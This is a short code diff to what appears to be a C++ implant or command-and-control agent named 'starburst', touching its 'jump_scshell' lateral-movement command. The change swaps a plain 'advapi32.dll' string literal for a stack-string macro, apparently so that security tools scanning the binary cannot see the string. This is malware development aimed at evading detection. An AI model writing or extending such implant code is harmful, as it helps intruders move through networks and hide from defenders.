@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <stackstr.h>
 
 #ifdef INCLUDE_CMD_JUMP_SCSHELL
 
@@ -42,8 +43,8 @@ auto declfn starburst::cmd_jump_scshell(
         return;
     }
 
-    HMODULE h_advapi = inst.kernel32.LoadLibraryA(
-        symbol<char*>( const_cast<char*>( "advapi32.dll" ) ) );
+    STK_ADVAPI32(_n);
+    HMODULE h_advapi = inst.kernel32.LoadLibraryA( _n );
     if ( !h_advapi ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "failed to load advapi32" ) ) );
